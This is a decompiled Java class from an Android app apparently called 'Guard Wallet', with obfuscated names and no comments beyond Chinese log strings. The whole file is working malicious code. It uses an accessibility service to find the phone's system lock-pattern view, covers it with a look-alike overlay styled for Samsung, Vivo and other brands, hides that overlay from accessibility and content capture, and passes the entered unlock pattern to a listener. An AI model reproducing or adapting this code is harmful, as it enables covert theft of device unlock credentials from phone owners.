package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.graphics.Color;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.support.v4.view.InputDeviceCompat;
import android.support.v4.view.ViewCompat;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.plug.C0225d;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0255k;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import o0.C0445h;
import o0.C0446i;
import o0.EnumC0442e;
import org.bouncycastle.tls.CipherSuite;
import p012o.C0416e;
import p012o.RunnableC0415d;

/* renamed from: com.guard.wallet.helper.o */
/* loaded from: classes.dex */
public abstract class AbstractC0192o {

    /* renamed from: a */
    public static WindowManager f224a;

    /* renamed from: b */
    public static final C0225d f225b = new C0225d();

    /* renamed from: c */
    public static final ReentrantLock f226c = new ReentrantLock();

    /* renamed from: d */
    public static final ConcurrentLinkedQueue f227d = new ConcurrentLinkedQueue();

    /* renamed from: e */
    public static final AtomicReference f228e = new AtomicReference();

    /* renamed from: f */
    public static final AtomicReference f229f = new AtomicReference();

    /* renamed from: a */
    public static CombineFilter m360a() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/colorLockPatternView", null, null, null, null));
        return combineFilter;
    }

    /* renamed from: b */
    public static CombineFilter m361b() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/lockPatternView", null, null, null, null));
        return combineFilter;
    }

    /* renamed from: c */
    public static void m362c(C0416e c0416e, ReqListenHelper reqListenHelper) {
        try {
            UiObject m366g = m366g(c0416e);
            if (m366g != null) {
                C0225d c0225d = f225b;
                c0225d.f268a.clear();
                WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                layoutParams.flags = 4786090;
                layoutParams.format = 1;
                layoutParams.alpha = 1.0f;
                layoutParams.dimAmount = 0.05f;
                m369j(layoutParams, m366g.boundsInScreen());
                C0445h c0445h = new C0445h(MyAccessibilityService.m554P());
                c0445h.setAspectRatioEnabled(true);
                c0445h.setInputEnabled(true);
                c0445h.setDotCount(3);
                m370k(c0445h);
                c0445h.setSystemUiVisibility(4);
                c0445h.setImportantForAccessibility(2);
                if (Build.VERSION.SDK_INT >= 30) {
                    c0445h.setImportantForContentCapture(2);
                }
                c0445h.f1043t.add(new C0446i(c0445h));
                if (f224a == null) {
                    f224a = (WindowManager) MyAccessibilityService.m554P().getSystemService("window");
                }
                layoutParams.type = 2032;
                AtomicReference atomicReference = f229f;
                if (atomicReference.get() == null) {
                    f224a.addView(c0445h, layoutParams);
                    atomicReference.set(c0445h);
                    f227d.offer(AbstractC0026q.m151B(reqListenHelper.getSubscribeId()) ? "NULL_REQ_LISTEN_HELPER" : reqListenHelper.getSubscribeId());
                    c0225d.f269b = reqListenHelper;
                    Log.d("com.guard.wallet.helper.o", "patternLockView 创建完成");
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.o", e2);
        }
    }

    /* renamed from: d */
    public static void m363d(C0416e c0416e, CombineFilter combineFilter, ReqListenHelper reqListenHelper) {
        try {
            if (MyAccessibilityService.m554P() != null && !m368i() && f227d.isEmpty()) {
                ReentrantLock reentrantLock = f226c;
                if (reentrantLock.tryLock()) {
                    f228e.set(combineFilter);
                    if (AbstractC0255k.m727a()) {
                        m362c(c0416e, reqListenHelper);
                    } else {
                        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0415d(c0416e, reqListenHelper, 7), 300L);
                    }
                    reentrantLock.unlock();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.o", e2);
        }
        m368i();
    }

    /* renamed from: e */
    public static void m364e() {
        try {
            WindowManager windowManager = f224a;
            AtomicReference atomicReference = f229f;
            if (windowManager != null && atomicReference.get() != null) {
                Log.d("com.guard.wallet.helper.o", "removeViewImmediate patternView");
                f224a.removeViewImmediate((View) atomicReference.get());
                ((C0445h) atomicReference.get()).m1174c();
            }
            f228e.set(null);
            atomicReference.set(null);
            f227d.clear();
            Log.d("com.guard.wallet.helper.o", "isPatternListening:" + m368i());
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.o", e2);
        }
    }

    /* renamed from: f */
    public static void m365f(String str, boolean z2) {
        try {
            ReentrantLock reentrantLock = f226c;
            if (reentrantLock.tryLock()) {
                C0225d c0225d = f225b;
                if (!z2) {
                    c0225d.f268a.clear();
                } else if (AbstractC0026q.m151B(str)) {
                    c0225d.m455a();
                } else {
                    c0225d.f270c.set(str);
                    c0225d.m455a();
                }
                if (AbstractC0255k.m727a()) {
                    m364e();
                } else {
                    new Handler(Looper.getMainLooper()).post(new RunnableC0183f(3));
                }
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.o", e2);
        }
        m368i();
    }

    /* renamed from: g */
    public static UiObject m366g(C0416e c0416e) {
        UiObject findOneByCombine;
        UiObject findOneByCombine2;
        UiObject findOneByCombine3;
        UiObject findOneByCombine4;
        UiObject findOneByCombine5;
        try {
            AtomicReference atomicReference = f228e;
            if (atomicReference.get() != null) {
                UiObject m1075n = c0416e.m1075n((CombineFilter) atomicReference.get());
                if (m1075n != null && (findOneByCombine5 = m1075n.findOneByCombine((CombineFilter) atomicReference.get())) != null) {
                    return findOneByCombine5;
                }
                if (MyAccessibilityService.m555Q() != null && (findOneByCombine4 = MyAccessibilityService.m555Q().findOneByCombine((CombineFilter) atomicReference.get())) != null) {
                    return findOneByCombine4;
                }
            }
            if (AbstractC0249e.m620i()) {
                UiObject m1075n2 = c0416e.m1075n(m360a());
                if (m1075n2 != null && (findOneByCombine3 = m1075n2.findOneByCombine(m360a())) != null) {
                    return findOneByCombine3;
                }
                if (MyAccessibilityService.m555Q() != null) {
                    return MyAccessibilityService.m555Q().findOneByCombine(m360a());
                }
                return null;
            }
            if (AbstractC0249e.m623l()) {
                UiObject m1075n3 = c0416e.m1075n(m371l());
                if (m1075n3 != null && (findOneByCombine2 = m1075n3.findOneByCombine(m371l())) != null) {
                    return findOneByCombine2;
                }
                if (MyAccessibilityService.m555Q() != null) {
                    return MyAccessibilityService.m555Q().findOneByCombine(m371l());
                }
                return null;
            }
            UiObject m1075n4 = c0416e.m1075n(m361b());
            if (m1075n4 != null && (findOneByCombine = m1075n4.findOneByCombine(m361b())) != null) {
                return findOneByCombine;
            }
            if (MyAccessibilityService.m555Q() != null) {
                return MyAccessibilityService.m555Q().findOneByCombine(m361b());
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.o", e2);
            return null;
        }
    }

    /* renamed from: h */
    public static boolean m367h() {
        C0225d c0225d = f225b;
        return (c0225d.f269b == null || c0225d.f268a.isEmpty()) ? false : true;
    }

    /* renamed from: i */
    public static boolean m368i() {
        return (f229f.get() == null || f224a == null) ? false : true;
    }

    /* renamed from: j */
    public static void m369j(WindowManager.LayoutParams layoutParams, Rect rect) {
        layoutParams.gravity = 8388659;
        layoutParams.x = rect.left;
        layoutParams.y = rect.top;
        layoutParams.width = rect.width();
        layoutParams.height = rect.height();
        Log.d("com.guard.wallet.helper.o", "screenWidth:" + rect.width());
        Log.d("com.guard.wallet.helper.o", "screenHeight:" + rect.height());
        Log.d("com.guard.wallet.helper.o", "StatusBarHeight:" + AbstractC0249e.m616e().getStatusBarHeight());
    }

    /* renamed from: k */
    public static void m370k(C0445h c0445h) {
        boolean m620i = AbstractC0249e.m620i();
        EnumC0442e enumC0442e = EnumC0442e.ALIGN_CENTER;
        if (m620i) {
            c0445h.setNormalStateColor(-7829368);
            c0445h.setDotNormalSize(30);
            c0445h.setDotSelectedSize(60);
            c0445h.setPathWidth(10);
            c0445h.setPathColor(-1);
            c0445h.setAspectRatio(1);
        } else {
            if (Build.BRAND.equalsIgnoreCase("samsung")) {
                c0445h.setNormalStateColor(-3355444);
                c0445h.setDotNormalSize(36);
                c0445h.setDotSelectedSize(50);
                c0445h.setPathWidth(10);
                c0445h.setPathColor(-1);
                c0445h.setAspectRatio(0);
                c0445h.setDotAlign(enumC0442e);
                c0445h.setDotAnimationDuration(100);
                c0445h.setPathEndAnimationDuration(200);
                return;
            }
            if (AbstractC0249e.m618g()) {
                c0445h.setNormalStateColor(-1);
                c0445h.setDotNormalSize(32);
                c0445h.setDotSelectedSize(50);
                c0445h.setDotSelectedColor(-1);
                c0445h.setPathWidth(20);
                c0445h.setPathColor(-7829368);
            } else if (AbstractC0249e.m623l()) {
                c0445h.setNormalStateColor(-3355444);
                c0445h.setDotSelectedSize(40);
                c0445h.setDotSelectedColor(InputDeviceCompat.SOURCE_ANY);
                c0445h.setPathWidth(30);
                c0445h.setPathColor(Color.parseColor("#FFF68F"));
                c0445h.setAspectRatio(0);
                c0445h.setDotNormalSize(20);
            } else {
                if (!AbstractC0249e.m624m() && !AbstractC0249e.m622k()) {
                    c0445h.setNormalStateColor(ViewCompat.MEASURED_STATE_MASK);
                    c0445h.setDotNormalSize(30);
                    c0445h.setDotSelectedSize(60);
                    c0445h.setDotSelectedColor(ViewCompat.MEASURED_STATE_MASK);
                    c0445h.setPathWidth(40);
                    c0445h.setPathColor(Color.argb(204, 0, 101, CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA));
                    c0445h.setAspectRatio(0);
                    c0445h.setDotAlign(enumC0442e);
                    c0445h.setDotAnimationDuration(50);
                    c0445h.setPathEndAnimationDuration(50);
                    return;
                }
                c0445h.setNormalStateColor(-1);
                c0445h.setDotNormalSize(20);
                c0445h.setDotSelectedSize(30);
                c0445h.setDotSelectedColor(-1);
                c0445h.setPathWidth(5);
                c0445h.setPathColor(-1);
            }
            c0445h.setAspectRatio(0);
        }
        c0445h.setDotAlign(enumC0442e);
        c0445h.setDotAnimationDuration(CipherSuite.TLS_RSA_WITH_SEED_CBC_SHA);
        c0445h.setPathEndAnimationDuration(100);
    }

    /* renamed from: l */
    public static CombineFilter m371l() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_lock_pattern_view", null, null, null, null));
        return combineFilter;
    }
}
